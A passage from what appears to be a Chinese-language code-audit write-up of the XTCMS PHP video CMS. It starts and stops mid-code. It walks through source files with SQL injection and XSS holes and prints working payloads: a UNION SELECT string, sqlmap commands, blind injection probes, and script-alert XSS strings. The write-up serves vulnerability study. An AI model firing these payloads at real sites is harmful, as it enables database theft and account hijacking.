<div class="highlight"><pre><span></span><span class="n">cid</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">UNION</span> <span class="k">ALL</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7162717a71</span><span class="p">,</span><span class="mi">0</span><span class="n">x4572725a7062476e5a734c4f51454742724f4579755449744967454b6a695461545a4857576a7952</span><span class="p">,</span><span class="mi">0</span><span class="n">x7170706271</span><span class="p">),</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">-- -</span>
</pre></div>
<p>（闭合竟然是小括号？）这是为什么？先放过，之后再来研究。</p>
<h5 data-content="1" id="f9772c8ae2feffe55b4a66ccfe436fd6">visit.php</h5>
<p>这个文件有注入漏洞，那么自然有理由推断，引用这个文件的文件也有相同的漏洞，所以全局搜索template/wapian/vlist.php文件，然后发现：</p>
<p>在很多文件如：</p>
<p>seacher.php, tv.php, ustv.php, wxseacher.php，vlist.php等文件中都有相同引用：</p>
<div class="highlight"><pre><span></span><span class="x">include('template/'.$xtcms_bdyun.'/wxseacher.php');</span>
</pre></div>
<p>这里的<strong>$xtcms_bdyun</strong>向上回溯实际上就是wapian，是从xtcms_vod_class这个数据库表中查询出的数据，因此是固定的。但是，在这些文件中，大部分都有关于<strong>include('system/inc.php');</strong>文件的引用，我们知道system/inc.php文件中又有<strong>require_once('function.php');</strong>文件的引用，即进行转义处理，也就断绝了sql注入。而只有visit.php这个文件中，代码如下：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cid'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
    <span class="cp">?&gt;</span><span class="x">                      </span>
<span class="cp">&lt;?php</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'select * from xtcms_vod_class where c_pid='</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cid'</span><span class="p">]</span><span class="o">.</span><span class="s1">' order by c_sort desc,c_id asc'</span><span class="p">);</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
            <span class="k">echo</span> <span class="s1">'&lt;a href="./vlist.php?cid='</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'c_id'</span><span class="p">]</span><span class="o">.</span><span class="s1">'" class="acat" style="white-space: pre-wrap;margin-bottom: 4px;"&gt;'</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'c_name'</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/a&gt;'</span><span class="p">;</span>
        <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>并没有对转义文件的引用，因此肯定存在该注入漏洞，直接sqlmap 跑一下，即可。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162028-8de75cde-cdde-1.png"/></p>
<h5 data-content="1" id="7fb511060439e8c8eb39f1ca28a2dd88"><strong>admin/cms_book_edit.php</strong></h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'select * from xtcms_book where id = '</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s1">''</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>有数据库交互，单引号闭合，不过文件头引入了<strong>../system/inc.php</strong>文件进行转义防注入处理，因此属于seay误报，同样的情况在</p>
<pre><code>admin/cms_ad_edit.php
admin/cms_admin_edit.php</code></pre>
<p>等文件中也相同出现，都有转义引用，而没有stripslashes() 函数去除预定义字符的处理，因此这写文件中的报洞都属于误报。</p>
<h5 data-content="1" id="891b2c64cf08784a73007425ca4902d4">admin/youlian_edit.php</h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'save'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">];</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'Reply'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Reply'</span><span class="p">];</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'update xtcms_youlian set '</span> <span class="o">.</span> <span class="nx">arrtoupdate</span><span class="p">(</span><span class="nv">$_data</span><span class="p">)</span> <span class="o">.</span> <span class="s1">' where id = '</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">alert_href</span><span class="p">(</span><span class="s1">'修改成功!'</span><span class="p">,</span> <span class="s1">'cms_youlian.php'</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">alert_back</span><span class="p">(</span><span class="s1">'修改失败!'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p><strong>$_GET['id']</strong>变量单引号闭合带入查询，且文件未引入转移保护，存在注入，sqlmap直接跑：</p>
<pre><code>python2 sqlmap.py -u "http://127.0.0.1/admin/youlian_edit.php?id=1" --dbs --batch</code></pre>
<p>直接出数据库</p>
<h5 data-content="1" id="e304d1128701e890833c19e9122121ac">admin/ad_edit.php  引用了模块文件admin/model/ad_edit.php</h5>
<div class="highlight"><pre><span></span><span class="c1">#admin/model/ad_edit.php</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>

<span class="k">if</span> <span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">'del'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="err">$</span><span class="n">sql</span> <span class="o">=</span> <span class="s1">'delete from xtcms_ad where id = '</span> <span class="o">.</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">'del'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mysql_query</span><span class="p">(</span><span class="err">$</span><span class="n">sql</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">alert_href</span><span class="p">(</span><span class="s1">'删除成功!'</span><span class="p">,</span> <span class="s1">'cms_ad.php'</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">alert_back</span><span class="p">(</span><span class="s1">'删除失败！'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">'save'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="n">null_back</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">'title'</span><span class="p">],</span> <span class="s1">'请填写广告名称'</span><span class="p">);</span>
    <span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s1">'title'</span><span class="p">]</span> <span class="o">=</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">'title'</span><span class="p">];</span>
    <span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s1">'pic'</span><span class="p">]</span> <span class="o">=</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">'pic'</span><span class="p">];</span>
    <span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]</span> <span class="o">=</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">];</span>
    <span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s1">'catid'</span><span class="p">]</span> <span class="o">=</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">'catid'</span><span class="p">];</span>
    <span class="err">$</span><span class="n">sql</span> <span class="o">=</span> <span class="s1">'update xtcms_ad set '</span> <span class="o">.</span> <span class="n">arrtoupdate</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">)</span> <span class="o">.</span> <span class="s1">' where id = '</span> <span class="o">.</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mysql_query</span><span class="p">(</span><span class="err">$</span><span class="n">sql</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">alert_href</span><span class="p">(</span><span class="s1">'广告修改成功!'</span><span class="p">,</span> <span class="s1">'cms_ad.php'</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">alert_back</span><span class="p">(</span><span class="s1">'修改失败!'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>同样的问题，可控变量直接拼接进查询，没有任何过滤，同样没有引入转义函数文件，应该存在注入,直接sqlmap一把梭。(而且这里还不只$_GET['id']一个变量，还有$_GET['del']变量可以同样的方式利用来注入)</p>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="n">python2</span> <span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s2">"http://127.0.0.1/admin/ad_edit.php?id(或者del)=1"</span> <span class="o">--</span><span class="n">dbs</span> <span class="o">--</span><span class="n">batch</span>
</pre></div>
<h5 data-content="1" id="9338dfa65d0fde3e4b0f3e8b7db12d09">/admin/cms_usergroup.php 引用模块文件admin/model/usergroup.php</h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'del'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">alert_back</span><span class="p">(</span><span class="s1">'默认会员组不能删除！'</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'del'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'delete from xtcms_user_group where ug_id = '</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'del'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">alert_href</span><span class="p">(</span><span class="s1">'删除成功!'</span><span class="p">,</span> <span class="s1">'cms_usergroup.php'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">alert_back</span><span class="p">(</span><span class="s1">'删除失败！'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'save'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ug_name'</span><span class="p">],</span> <span class="s1">'请填写名称'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'ug_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ug_name'</span><span class="p">];</span>
    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">arrtoinsert</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'insert into xtcms_user_group ('</span> <span class="o">.</span> <span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s1">') values ('</span> <span class="o">.</span> <span class="nv">$str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">')'</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">alert_href</span><span class="p">(</span><span class="s1">'添加成功!'</span><span class="p">,</span> <span class="s1">'cms_usergroup.php'</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">alert_back</span><span class="p">(</span><span class="s1">'添加失败!'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>一模一样的问题，但是这个主文件<strong>/admin/cms_usergroup.php</strong>中引用了转义文件来防注入，此处又进行了单引号包裹，应该是杜绝了sql注入的道路了呀，但是我看网上的师傅们又直接用类似</p>
<pre><code>id=1%20and%20ascii(left(database(),1))=106--+    #回显错误
id=1%20and%20ascii(left(database(),1))=107--+    #回显正常   
证明数据库第一个字母为k
或者
?del=2%20and%20sleep(10)延时</code></pre>
<p>的payload 成功进行了sql注入，我进行复现也确实能做到，<strong>可这和前面的分析互相矛盾了呀，这是为什么呢？有大师傅知道可以讲解一下吗？</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162110-a6df701e-cdde-1.png"/></p>
<p>那么按照相同的思路，去查找到了后台所有的删除有关的文件，发现情况都是一样，因此这个cms存在一个全后台的delete删除的注入漏洞。</p>
<h4 data-content="1" id="f138695a4d5af98e6238a94ff5f1f356">XSS</h4>
<h5 data-content="1" id="4859747e6175bfd7a23093fdec807a10">/youlian.php  存储型xss</h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
<span class="k">include</span><span class="p">(</span><span class="s1">'system/inc.php'</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])){</span>
<span class="nx">null_back</span><span class="p">(</span><span class="s1">'admin'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">);</span>
    <span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">],</span><span class="s1">'你的链接及网站名'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]</span> <span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'time'</span><span class="p">]</span> <span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s1">'y-m-d h:i:s'</span><span class="p">,</span><span class="nb">time</span><span class="p">());</span>

    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">arrtoinsert</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'insert into xtcms_youlian ('</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">') values ('</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">')'</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)){</span>

<span class="nx">alert_href</span><span class="p">(</span><span class="s1">'申请成功！请耐心等待管理员核实！谢谢！'</span><span class="p">,</span><span class="s1">'youlian.php'</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
<span class="nx">alert_back</span><span class="p">(</span><span class="s1">'申请失败！请联系网站底部邮箱申请吧！'</span><span class="p">);</span>
    <span class="p">}</span>
</pre></div>
<p>引入转义文件转义防sql注入，变量content经过<strong>null_back()</strong>函数处理，（该函数可以全局搜索到定义，作用是判断字符串内容是否为空，没有任何过滤）又使用addlashes()方法处理变量，防注入，其他变量都没问题，但这个<strong>$_POST['content']</strong>变量，不是又经过了双层转义处理？那么对xss的防御效果自然就没了，而且这里和后台交互，应该可以形成一个存储型xss:</p>
<p>payload:</p>
<pre><code>&lt;script&gt;alert(/123456/)&lt;/script&gt;</code></pre>
<p>留言，然后进后台查看，成功弹窗，存储型xss一枚：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162131-b3597880-cdde-1.png"/></p>
<p>同样的思路，直接全局搜索</p>
<pre><code>&lt;?php echo $_GET[</code></pre>
<p>直接输出的地方是xss常出现的地方：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162144-bb37e5fa-cdde-1.png"/></p>
<p>有收获，一个个看：</p>
<h5 data-content="1" id="7af3fc5fd26f648e193854f2592e8707">/admin/cms_kamilist.php 反射型xss</h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'cms_check.php'</span><span class="p">);</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">'inc_header.php'</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="x"></span>

<span class="x">        &lt;!-- Start: Content --&gt;</span>
<span class="x">        &lt;div class="container-fluid content"&gt;   </span>
<span class="x">            &lt;div class="row"&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">'inc_left.php'</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">。。。。</span>
<span class="x">。。。。</span>
<span class="x">。。。。</span>
<span class="x">&lt;a class="btn btn-info" href="cms_dao.php</span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s1">'?cpass='</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"id"</span><span class="p">];}</span><span class="cp">?&gt;</span><span class="x">"&gt;&lt;span class="icon-plus-square"&gt;导出&lt;/span&gt;&lt;/a&gt;</span>
<span class="x">                        &lt;/div&gt;</span>
</pre></div>
<p>中间不重要，我们直接省略，看关键位置。<strong>$_GET['id']</strong>变量经过判断，若果存在，引入转义文件过滤预定义字符（但我们知道，该方法对xss的防御力几近于无）然后对变量直接输出，这就造成了一个简单的反射型xss</p>
<p>构造闭合payload,成功get一枚反射性xss</p>
<pre><code>?id="&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162227-d4af234a-cdde-1.png"/></p>
<p>同样的方法</p>
<h5 data-content="1" id="870fe50f8e388bc91e3c95946b7a00f8">
<strong>/wap/shang.php</strong> <strong>反射型xss</strong>
</h5>
<p>同样的漏洞原理，这里就不赘述了，直接看效果</p>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="x">?fee=&lt;script&gt;alert(/wowoowo/)&lt;/script&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162238-db490d1a-cdde-1.png"/></p>
<h5 data-content="1" id="0252e8fc5847506781be86cf159041d8">/wap/movie.php</h5>
<h5 data-content="1" id="c83991805ed821e750ad89ca7ebb452d">/wap/tv.php</h5>
<h5 data-content="1" id="609cedc1f027724c8f14803abb2a158c">/wap/zongyi.php</h5>
<h5 data-content="1" id="19a6cea7f012a0a945c83857cc4e8a4a">/wap/dongman.php 反射型xss</h5>
<p>这几个文件都有同样的xss漏洞，形成原理也一样，就拿其中一个进行分析。查看movie.php 里的内容。</p>
<div class="highlight"><pre><span></span><span class="x">#/wap/movie.php</span>
<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="k">include</span> <span class="s1">'../system/list.php'</span><span class="p">;</span>
<span class="nv">$page</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span><span class="cp">?&gt;</span><span class="x"></span>
<span class="cp">&lt;?php</span> 
<span class="nv">$b</span><span class="o">=</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'m'</span><span class="p">],</span><span class="s1">'rank='</span><span class="p">));</span>
<span class="nv">$ye</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'m'</span><span class="p">],</span><span class="nv">$b</span><span class="o">+</span><span class="mi">5</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x">      </span>
<span class="x">&lt;a </span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$ye</span><span class="o">==</span><span class="s2">"rankhot"</span><span class="p">){</span><span class="k">echo</span> <span class="s1">'class="on"'</span><span class="p">;}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$ye</span><span class="o">==</span><span class="s2">"createtime"</span> <span class="k">or</span> <span class="nv">$ye</span><span class="o">==</span><span class="s2">"rankpoint"</span><span class="p">){}</span><span class="k">else</span><span class="p">{</span> <span class="k">echo</span> <span class="s1">'class="on"'</span><span class="p">;};</span><span class="cp">?&gt;</span><span class="x"> href="?m=/dianying/list.php?rank=rankhot"&gt;最近热映&lt;/a&gt; </span>
<span class="x"> &lt;a  </span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$ye</span><span class="o">==</span><span class="s2">"createtime"</span><span class="p">){</span><span class="k">echo</span> <span class="s1">'class="on"'</span><span class="p">;}</span><span class="k">else</span><span class="p">{};</span><span class="cp">?&gt;</span><span class="x"> href="?m=/dianying/list.php?rank=createtime"&gt;最新上映&lt;/a&gt;   </span>
<span class="x">    &lt;a  </span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$ye</span><span class="o">==</span><span class="s2">"rankpoint"</span><span class="p">){</span><span class="k">echo</span> <span class="s1">'class="on"'</span><span class="p">;}</span><span class="k">else</span><span class="p">{};</span><span class="cp">?&gt;</span><span class="x"> href="?m=/dianying/list.php?rank=rankpoint"&gt;最受好评&lt;/a&gt;</span>
</pre></div>
<p>发现了$_GET['page']和$_GET['m']变量，并引入转义文件进行转义防注入处理（sql）,看来有戏，找找输出：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">getPageHtml</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$fenye</span><span class="p">,</span><span class="s1">'movie.php?m='</span><span class="o">.</span><span class="nv">$yourneed</span><span class="o">.</span><span class="s1">'&amp;page='</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>根进getpageHtml函数 文件在system/function.php，仔细查看发现它并没有对传参进行完整的过滤，因此也就造成了XSS漏洞，但还是没找到输出点，怎么办？</p>
<p>没办法，只好结合黑盒方法，访问页面，关键字查找输出点了：访问：</p>
<pre><code>http://127.0.0.1//wap/movie.php?m=aaa</code></pre>
<p>然后ctrl+F,查找（?m=aaa）,终于发现输出点：</p>
<div class="highlight"><pre><span></span><span class="x">&lt;a style="background:#FF9900;"&gt;&lt;font color="#fff"&gt;1&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="movie.php?m=aaa&amp;page=2"&gt;2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="movie.php?m=aaa&amp;page=3"&gt;3&lt;/a&gt;</span>
</pre></div>
<p>构造闭合，打一打：</p>
<div class="highlight"><pre><span></span><span class="n">payload</span><span class="p">:</span> <span class="err">?</span><span class="n">m</span><span class="o">=</span><span class="s2">"&gt;&lt;script&gt;alert(/wowowo/)&lt;/script&gt;</span>
</pre></div>
<p>成功弹窗，反射型xss到手</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162252-e3a995b0-cdde-1.png"/></p>
<h5 data-content="1" id="aa55d78730c39cda7a8ce39fe596e204">/book.php  和/wap/book.php 存储型xss</h5>
<p>查看文件，关键代码：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])){</span>
<span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">],</span><span class="s1">'请输入姓名'</span><span class="p">);</span>
    <span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">],</span><span class="s1">'请输入内容'</span><span class="p">);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">];</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]</span> <span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]);</span>
    <span class="nv">$data</span><span class="p">[</span><span class="s1">'time'</span><span class="p">]</span> <span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s1">'y-m-d h:i:s'</span><span class="p">,</span><span class="nb">time</span><span class="p">());</span>

    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">arrtoinsert</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'insert into xtcms_book ('</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">') values ('</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">')'</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)){</span>

<span class="nx">alert_href</span><span class="p">(</span><span class="s1">'留言成功!小的马上为您准备相关资源！'</span><span class="p">,</span><span class="s1">'book.php'</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
<span class="nx">alert_back</span><span class="p">(</span><span class="s1">'抱歉！服务器好像开小差了呢！'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    .....</span>
<span class="x">    .....</span>
<span class="x">    .....</span>
<span class="cp">&lt;?php</span>
<span class="nv">$sqll</span> <span class="o">=</span> <span class="s1">'select * from xtcms_book order by id desc'</span><span class="p">;</span>
<span class="nv">$pager</span> <span class="o">=</span> <span class="nx">page_handle</span><span class="p">(</span><span class="s1">'page'</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sqll</span><span class="p">)));</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sqll</span><span class="o">.</span><span class="s1">' limit '</span><span class="o">.</span><span class="nv">$pager</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">','</span><span class="o">.</span><span class="nv">$pager</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">''</span><span class="p">);</span>
<span class="p">(</span><span class="nv">$row</span><span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
